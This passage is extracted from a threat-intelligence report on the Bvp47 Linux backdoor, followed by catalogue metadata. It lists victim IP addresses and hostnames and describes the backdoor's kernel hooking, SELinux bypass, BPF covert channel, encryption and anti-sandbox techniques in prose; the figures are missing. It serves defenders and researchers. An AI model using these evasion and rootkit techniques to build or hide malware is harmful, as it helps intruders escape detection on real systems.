202.54.49.70 203.197.183.66 203.199.143.2 203.90.127.22 61.0.0.46 61.0.0.71 61.1.128.17 61.1.128.71 61.1.64.45 195.68.99.20 212.35.107.2 213.41.77.50 213.41.78.10 213.41.78.12 213.41.78.13 213.41.78.14 193.188.71.4 200.9.97.3 159.226.*.* 159.226.*.* 159.226.*.*|Italy Italy Italy Italy Italy Italy Italy Italy India India India India India India India India India India India India India India UK UK UK UK UK UK UK Jordan Chile China China China|Italy Italy Italy Universita' degli Studi Mediterranea di Reggio Calabria Italy Universita' degli Studi Mediterranea di Reggio Calabria Italy Universita' degli Studi Mediterranea di Reggio Calabria Italy Universita' degli Studi Mediterranea di Reggio Calabria Italy Italy India Banaras Hindu University India Education Network Sri Lanka India India India India India India India India India India India UK Belgium UK UK UK UK UK Jordan Chile|\n|---|---|---|---|\n\n\n-----\n\n|Col1|166.111.*.* 166.111.*.* 166.111.*.* 168.160.*.* 202.101.*.* 202.107.*.* 202.112.*.* 202.112.*.* 202.112.*.* 202.117.*.* 202.121.*.* 202.127.*.* 202.166.*.* 202.166.*.* 202.197.*.* 202.197.*.* 202.201.*.* 202.201.*.* 202.204.*.* 202.38.*.* 202.84.*.* 202.96.*.* 202.96.*.* 202.98.*.* 202.99.*.* 210.72.*.* 210.77.*.* 210.83.*.* 211.137.*.* 211.138.*.* 211.82.*.* 218.104.*.* 202.94.*.* 218.107.*.* 218.245.*.* 218.247.*.*|China China China China China China China China China China China China China China China China China China China China China China China China China China China China China China China China China China China China|Col4|\n|---|---|---|---|\n\n\n-----\n\n|mars.ee.nctu.tw cad-server1.ee.nctu.edu.tw expos.ee.nctu.edu.tw twins.ee.nctu.edu.tw soldier.ee.nctu.edu.tw royals.ee.nctu.edu.tw mail.et.ntust.edu.tw mail.dyu.edu.tw mail.ncue.edu.tw aries.ficnet.net ns.chining.com.tw mail.tccn.edu.tw mail.must.edu.tw ultra10.nanya.edu.tw mail.hccc.gov.tw|218.29.*.* 218.29.*.* 222.22.*.* 61.151.*.* 202.175.*.* 202.175.*.* 202.175.*.* 202.175.*.* 202.175.*.* 202.175.*.* 140.113.212.13 140.113.212.150 140.113.212.20 140.113.212.26 140.113.212.31 140.113.212.9 140.118.2.53 163.23.1.73 163.23.225.100 202.145.137.19 202.39.26.50 203.64.35.108 203.68.220.40 203.68.40.6 210.241.6.97|China China China China Macau, China Macau, China Macau, China Macau, China Macau, China Macau, China Taiwan, China Taiwan, China Taiwan, China Taiwan, China Taiwan, China Taiwan, China Taiwan, China Taiwan, China Taiwan, China Taiwan, China Taiwan, China Taiwan, China Taiwan, China Taiwan, China Taiwan, China|National Chiao Tung University of Hsinchu City, Taiwan Province National Chiao Tung University of Hsinchu City, Taiwan Province National Chiao Tung University of Hsinchu City, Taiwan Province National Chiao Tung University of Hsinchu City, Taiwan Province National Chiao Tung University of Hsinchu City, Taiwan Province National Chiao Tung University of Hsinchu City, Taiwan Province National Taiwan University of Science and Technology, Taipei, Taiwan Province Taiwan Province TANet Taiwan Province TANet Taiwan Fixed Network, Taiwan Province Chunghwa Telecom, Taiwan Province Hualien County Tzu Chi University of Science and Technology, Taiwan Province Taiwan Province Taiwan Province Taiwan Province|\n|---|---|---|---|\n\n\n-----\n\n-----\n\n###### Exploit the victim host as a jump server to attack target\n\nThere was a network traffic evidence indicated that attacker would exploit the victim host as a jump server\nor C2 to attack target, namely, 210.135.90.0/24 in Japan played a C2 server in 2015.\n\n\n-----\n\n##### 6. Detailed Techniques of   Bvp47 Backdoor\n\nThe implementation of Bvp47 includes complex code, segment encryption and decryption, Linux multi-version platform adaptation, rich rootkit anti-tracking techniques, and most importantly, it integrates advanced\nBPF engine used in advanced covert channels, as well as cumbersome communication encryption and\ndecryption process.\n\nThis chapter will analyze the above aspects.\n\n###### Main Behaviors\n\nThere are several key points in the program initialization as follows:\n\n1. Linux user mode and kernel mode. The process in user mode will remain alive\n\n2. Initialize the Bvp engine\n\n3. A series of environmental tests. If environmental information do not meet requirements, sample will be\nautomatically deleted.\n\n4. A series of payload block decryption\n\n5. Tamper with kernel devmem restrictions. This will allow process in user mode to directly read and write\nkernel space. And other kernel techniques are used as well.\n\n6. Load non-standard lkm module files\n\n7. Hook system function in order to hide its own process, file, network, and self-deleting detection in the\ncovered channel communication as follows:\n\na . After Bvp47 receives the SYN packet sent by the server, it will match the packet format in BPF filter\nrules (see below)\n\nb . Only after satisfying the BPF rules in operation 1, encryption algorithms such as RSA+RC-X will be\ndecrypted;\n\nc . Perform corresponding command operations according to the decrypted instructions;\n\n\n-----\n\n###### Payload\n\nThe entire file of Bvp47 adopts the commonly used backdoor packaging method, that is, the backdoor\nfunction modules are compressed and assembled and then placed at the end of the file, and the whole file\nexists in the form of additional data. The additional data is loaded through the loader function module built\ninto the program, which mainly completes the following steps:\n\n###### Read\n\n Check\n\n Unzip\n\n Decryption\n\n Load\n\nThe main data structure of payload is as follows:\n\nThe specific content corresponding to the sample is as follows:\n\n\n-----\n\n-----\n\n1. Call four different decryption functions (the underlying decryption method is the same) to complete the\ndecompression operation of each slice;\n\n2. After completing operation 1, the loader will continue to call the Xor 0x47 algorithm (see other chapters)\nto complete the decryption of slice.\n\nThe specific decryption functions are as follows:\n\n\n-----\n\n###### Strings Encryption\n\nIn the Bvp47 sample, many strings and blocks are encrypted to lower the possibility of exposure. These\nencryption techniques are mainly based on XOR operation. These subtle encryptions will cause considerable analysis costs to the researchers.\n\nAccording to the analysis, there are mainly 8 kinds of XOR operations:\n\nThe algorithm of 0xa8a16d65_xor is as follows:\n\n\n-----\n\n###### Techniques of Function Name Obfuscation\n\nThe export functions of some code slice modules in Bvp47's payload generally use the form of \"digital\nnames\" to provide interface services to external. Such confusion creates a big obstacle for researchers in\nanalyzing the function analysis of the export interface:\n\n\n-----\n\n###### Bvp Engine\n\nTo improve its versatility, Bvp47 uses many dynamic calculations of Linux kernel data and function\naddresses. At the same time, to be fundamentally compatible with a large amount of Linux kernel data and\nvarious independently developed sections of the payload, they developed the Bvp engine to dynamically\nredirect and adapt the system functions and data structures required by Bvp47 in compilation and runtime.\n\nThe Bvp engine adapts many functions and data structures:\n\n\n-----\n\n-----\n\n-----\n\nParsed result of the Bvp engine format in 0x0b:\n\nThe MD5 value calculation method in the above figure is to read the content of /proc/version, and directly\ncalculate the MD5 value as the unique identifier of the operating system kernel. Different versions of the\nkernel will correspond to the corresponding MD5 and structure values.\n\nTo verify the accuracy of the MD5 value, a series of kernel versions are collected as follows:\n\n\n-----\n\n-----\n\nvalues marked with the digital version number in the upper half of the figure can be found in Bvp47, and\nthey are all affected system versions):\n\n###### System Hook \n\nBvp47 mainly hooks nearly 70 process functions in the Linux operating system kernel, which are mainly\nused to hide network, process, file, and SeLinux bypass, etc. More details are as follows:\n\n|Hooked Function devmem_is_allowed page_is_ram sys_swapon si_swapinfo do_fork release_task dev_ioctl d_alloc vfs_readdir sys_unlink sys_rmdir vfs_getattr vfs_getattr64 tcp4_seq_show listening_get_next established_get_next udp4_seq_show raw_seq_show|Hook Location Middle of Function Middle of Function Start of Function Start of Function Middle of Function Start of Function Start of Function Start of Function Start of Function Middle of Function Middle of Function Start of Function Start of Function Start of Function Start of Function Start of Function Start of Function Start of Function|Hook Technique inline hook inline hook inline hook inline hook inline hook inline hook inline hook inline hook inline hook inline hook inline hook inline hook inline hook inline hook inline hook inline hook inline hook inline hook|\n|---|---|---|\n\n\n-----\n\npacket_seq_show\n\n\nStart of Function\n\n\ninline hook\n\n\nunix_seq_show\n\n\nStart of Function\n\n\ninline hook\n\n\nSelinux_xxx_\n\n\nStart of Function\n\n\ninline hook\n\n\nget_raw_sock\n\n\nStart of Function\n\n\ninline hook\n\n\nget_raw_sock\n\n\nStart of Function\n\n\ninline hook\n\n\nsock_init_data\n\n\nStart of Function\n\n\ninline hook\n\n\ntcp_time_wait\n\n\nMiddle of Function\n\n\ninline hook\n\n\nunix_accept\n\n\nStart of Function\n\n\ninline hook\n\n\nread_mem\n\n\nStart of Function\n\n\ninline hook\n\n\n__inode_dir_notify\n\n\nStart of Function\n\n\ninline hook\n\n\navc_has_perm\n\n\nMiddle of Function\n\n\ninline hook\n\n\ndo_mount\n\n\nStart of Function\n\n\ninline hook\n\n\nsys_umount\n\n\nStart of Function\n\n\ninline hook\n\n\ndo_acct_process\n\n\nStart of Function\n\n\ninline hook\n\n\nproc_root_lookup Start of Function inline hook\n\n\nproc_pid_readdir\n\n\nStart of Function\n\n\ninline hook\n\n\nkill_something_info\n\n\nMiddle of Function\n\n\ninline hook\n\n\nsys_kill\n\n\nStart of Function\n\n\ninline hook\n\n\nsys_rt_sigqueueinfo\n\n\nStart of Function\n\n\ninline hook\n\n\nsys_tkill\n\n\nStart of Function\n\n\ninline hook\n\n\nsys_tgkill\n\n\nStart of Function\n\n\ninline hook\n\n\nsys_getpriority\n\n\nStart of Function\n\n\ninline hook\n\n\nsys_setpriority\n\n\nStart of Function\n\n\ninline hook\n\n\nsys_getpgid\n\n\nStart of Function\n\n\ninline hook\n\n\nsys_getsid\n\n\nStart of Function\n\n\ninline hook\n\n\nsys_capget\n\n\nStart of Function\n\n\ninline hook\n\n\nsetscheduler\n\n\nStart of Function\n\n\ninline hook\n\n\nsys_sched_getscheduler\n\n\nMiddle of Function\n\n\ninline hook\n\n\nsys_sched_getparam\n\n\nMiddle of Function\n\n\ninline hook\n\n\nsched_getaffinity\n\n\nMiddle of Function\n\n\ninline hook\n\n\nsched_setaffinity\n\n\nMiddle of Function\n\n\ninline hook\n\n\n-----\n\nsys_sched_rr_get_interval\n\n\nMiddle of Function\n\n\ninline hook\n\n\nsys_ptrace\n\nsys_wait4\n\nsys_waitid\n\ndo_execve\n\nsys_close\n\nsys_open\n\nsys_read\n\nsys_write\n\nsys_dup\n\nsys_dup2\n\nsys_accept\n\nsys_bind\n\nsys_connect\n\nsys_sendto\n\nsys_sendmsg\n\nsys_recvfrom\n\nsys_recvmsg\n\n\nStart of Function\n\nStart of Function\n\nStart of Function\n\nStart of Function\n\nStart of Function\n\nStart of Function\n\nStart of Function\n\nStart of Function\n\nStart of Function\n\nStart of Function\n\nStart of Function\n\nStart of Function\n\nStart of Function\n\nMiddle of Function\n\nMiddle of Function\n\nMiddle of Function\n\nMiddle of Function\n\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\ninline hook\n\n\nExample 1: Comparison of the hook of the __d_lookup function:\n\n\n-----\n\nhooking procedure is also to verify if upper layer application access /usr/bin/modload file. First part of the\nhandle function is as follows:\n\nIn the handler function, a lot of techniques of instant function search are used:\n\n\n-----\n\nAfter hooking devmem_is_allowed, Bvp47 can read and write the kernel space in user mode.\n\n\n-----\n\nBy leveraging internal inline hook to avc_has_perm, Bvp47 can bypass SeLinux for any operations without\nlimitation.\n\n\n-----\n\nBvp47 will filter read operations in sys_read.\n\n\n-----\n\n###### AV Evasion in Kernel Module\n\nBvp47 will modify the first four bytes of the elf file of the kernel module to avoid memory search for elf and\nload it through its own lkm loader.\n\n###### BPF Covert Channel\n\nBPF (Berkeley Packet Filter) is a kernel engine used in the Linux kernel to filter custom format packets. It\ncan provide a set of prescribed languages for ordinary process in user layer to filter the specified data\npackets.\n\nBvp47 directly uses this feature of BPF as an advanced technique at the Linux kernel level in the covert\nchannel to avoid direct kernel network protocol stack hooks from being detected by researchers.\n\nThe specific BPF usage are as follows. Only SYN packets (including UDP packets) that meet the rules will\nbe sent to the next step for encryption and decryption:\n\n\n-----\n\n-----\n\npacket is 0x88 bytes. The structure of the Trigger Packege field is shown in the figure:\n\nField structure diagram:\n\n###### The red part: the data length is 0x0088 XOR 0xE6CF;\n\n The green part: the actual length of the decrypted data;\n\n The dark blue part: purple Random and 0x9D6A XOR;\n\n\n-----\n\n###### Channel Encryption and Decryption\n\nBvp47 uses asymmetric algorithms RSA and the RC-X algorithm as a guarantee for the security of the\ncommunication link. Intermediate calculations will involve factors such as the time and length of sending\nand receiving packets. Some of the key pairs are as follows:\n\n\n-----\n\n-----\n\n###### Runtime Environment Detection\n\nTo better protect itself, Bvp47 has made a series of operating environment tests to prevent security\nresearchers from directly performing dynamic analysis after the sample is obtained. After decrypting the\nfirst block of the payload, a 32-bit unsigned integer value will be obtained. This value is mainly used as a\nchecksum to verify the operating environment. The specific verification method is as follows:\n\n1. Loader executes statvsf(\"/\", &stats);\n\n2. Get operation 1 blocks and files in the execution result;\n\n3. Compare the results of blocks ^ files == checksum ?. If they are equal, it is judged that the current environment meet requirements of running;\n\n\n-----\n\n###### Other Techniques\n\n 1. Use setrlimit api to set the core dump file size to 0 to prevent sample extraction;\n\n 2. Anti-sandbox technology combined with argv[0] and lstat;\n\nUntrusted programs are often run by sandboxes and monitor behavior. When the program is running,\nit often does not really land, that is to say, the path pointed to by argv[0] at this time is not the real path\nof the program. The program calls lstat through syscall to bypass the Hook of SandboxRing3 and check\nwhether the file pointed to by argv[0] really exists.\n\n###### 3. mkstmp anti-sandbox technology\n\nAPI used to generate temporary files in the Linux /tmp directory when mkstmp. (from our assumption:\nbecause the sandbox did not provide support for this API at the time, or the sandbox policy disabled\nmkstmp. Therefore, the success of the mkstmp call can be used to identify the sandbox).\n\n###### 4. /boot anti-sandbox technology\n\nThere are often only two directories in the /boot directory in the sandbox: /boot/. and /boot/... So if you\nopen the /boot directory to count the number of files in the /boot directory, you can often identify the\nsandbox. (On Windows, the number of temporary files in the TEMP directory will be passed).\n\n###### 5. API Flooding and Delayed Execution\n\nAny sandbox will only allocate a limited amount of time to each sample. Therefore, many legitimate\nAPIs are called to delay execution to avoid the initiation analysis of the sandbox.\n\n\n-----\n\n#### 7. Summary\n\nAs an advanced attack tool, Bvp47 has allowed the world to see its complexity, pertinence and\nforward-looking. What is shocking is that after analysis, it has been realized that it may have existed for\nmore than ten years. According to the information learned through Shadow Brokers Leaks and NSA ANT\ncatalog channels, the engineering behind it basically involves the full *nix platform, and the advanced\nSYNKnock covert channel technology it uses may involve the Cisco platform, Solaris, AIX, SUN and even\nthe Windows platform.\n\nWhat kind of force is driving its development? It may be possible to get some answers from multiple victim\nunits, which generally come from key departments of the state.\n\nPangu Lab as a cyber security team that insists on high-precision technology-driven, we soberly aware of\nthe powerful ability of the world's super-class APT group in attacking technology. We could only protect\nusers in future cyber confrontations by actively exploring of the cutting-edge technology of information\nsecurity attack and defense, keeping tracking important incidents, and coordinating with cybersecurity\nprofessionals globally.\n\n\n-----\n\n### 8. References\n\n###### 1. The Shadow Brokers: don’t forget your base\n\n   https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1 \n\n 2. The Shadow Brokers: x0rz-EQGRP  https://github.com/x0rz/EQGRP/  \n\n 3. NSA ANT catalog – Wikipedia  https://en.wikipedia.org/wiki/NSA_ANT_catalog\n\n 4. FOXACID-Server-SOP-Redacted.pdf\n\n https://edwardsnowden.com/docs/doc/FOXACID-Server-SOP-Redacted.pdf\n\n\n-----\n\n### About Pangu Lab\n\nBeijing Qi an Pangu Laboratory Technology Co., Ltd. was established on the basis of Pangu laboratory, a\nwell-known cyber security team. It focuses on advanced security research and attack and defense\nresearch, and has a deep research ability and experience in operating system, virtualization, Internet of\nthings and application security research.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.pangulab.cn/files/The_Bvp47_a_top-tier_backdoor_of_us_nsa_equation_group.en.pdf",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2022/2022.02.23.Bvp47/The_Bvp47_a_top-tier_backdoor_of_us_nsa_equation_group.en.pdf"
    ],
    "report_names": [
        "The_Bvp47_a_top-tier_backdoor_of_us_nsa_equation_group.en.pdf",
        "The_Bvp47_a_top-tier_backdoor_of_us_nsa_equation_group.en"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c91e335e-42be-48d9-96b5-ba56749a723b",
            "created_at": "2022-10-25T16:07:23.458346Z",
            "updated_at": "2025-03-27T02:02:09.813395Z",
            "deleted_at": null,
            "main_name": "CIA",
            "aliases": [
                "Central Intelligence Agency"
            ],
            "source_name": "ETDA:CIA",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d4f7cf97-9c98-409c-8b95-b80d14c576a5",
            "created_at": "2022-10-25T16:07:24.561104Z",
            "updated_at": "2025-03-27T02:02:10.281202Z",
            "deleted_at": null,
            "main_name": "Shadow Brokers",
            "aliases": [],
            "source_name": "ETDA:Shadow Brokers",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "08623296-52be-4977-8622-50efda44e9cc",
            "created_at": "2023-01-06T13:46:38.549387Z",
            "updated_at": "2025-03-27T02:00:02.859535Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "Tilded Team",
                "EQGRP",
                "G0020"
            ],
            "source_name": "MISPGALAXY:Equation Group",
            "tools": [
                "EquationLaser",
                "EquationDrug",
                "DoubleFantasy",
                "TripleFantasy",
                "GrayFish"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "171b85f2-8f6f-46c0-92e0-c591f61ea167",
            "created_at": "2023-01-06T13:46:38.830188Z",
            "updated_at": "2025-03-27T02:00:02.929729Z",
            "deleted_at": null,
            "main_name": "The Shadow Brokers",
            "aliases": [
                "Shadow Brokers",
                "ShadowBrokers",
                "The ShadowBrokers",
                "TSB"
            ],
            "source_name": "MISPGALAXY:The Shadow Brokers",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2d9fbbd7-e4c3-40e5-b751-27af27c8610b",
            "created_at": "2024-05-01T02:03:08.144214Z",
            "updated_at": "2025-03-27T02:05:17.419705Z",
            "deleted_at": null,
            "main_name": "PLATINUM COLONY",
            "aliases": [
                "Equation Group "
            ],
            "source_name": "Secureworks:PLATINUM COLONY",
            "tools": [
                " EquationDrug",
                " EquationLaser",
                " Fanny",
                " GrayFish",
                " TripleFantasy",
                "DoubleFantasy"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e0fed6e6-a593-4041-80ef-694261825937",
            "created_at": "2022-10-25T16:07:23.593572Z",
            "updated_at": "2025-03-27T02:02:09.879892Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "APT-C-40",
                "Platinum Colony",
                "Tilded Team"
            ],
            "source_name": "ETDA:Equation Group",
            "tools": [
                "Bvp47",
                "DEMENTIAWHEEL",
                "DOUBLEFANTASY",
                "DanderSpritz",
                "DarkPulsar",
                "DoubleFantasy",
                "DoubleFeature",
                "DoublePulsar",
                "Duqu",
                "EQUATIONDRUG",
                "EQUATIONLASER",
                "EQUESTRE",
                "Flamer",
                "GRAYFISH",
                "GROK",
                "OddJob",
                "Plexor",
                "Prax",
                "Regin",
                "Skywiper",
                "TRIPLEFANTASY",
                "Tilded",
                "UNITEDRAKE",
                "WarriorPride",
                "sKyWIper"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666859773,
    "ts_updated_at": 1743041746,
    "ts_creation_date": 0,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/b6a45bf5c338924a200e7c67eef4c3601dce0c9e.pdf",
        "text": "https://archive.orkl.eu/b6a45bf5c338924a200e7c67eef4c3601dce0c9e.txt",
        "img": "https://archive.orkl.eu/b6a45bf5c338924a200e7c67eef4c3601dce0c9e.jpg"
    }
}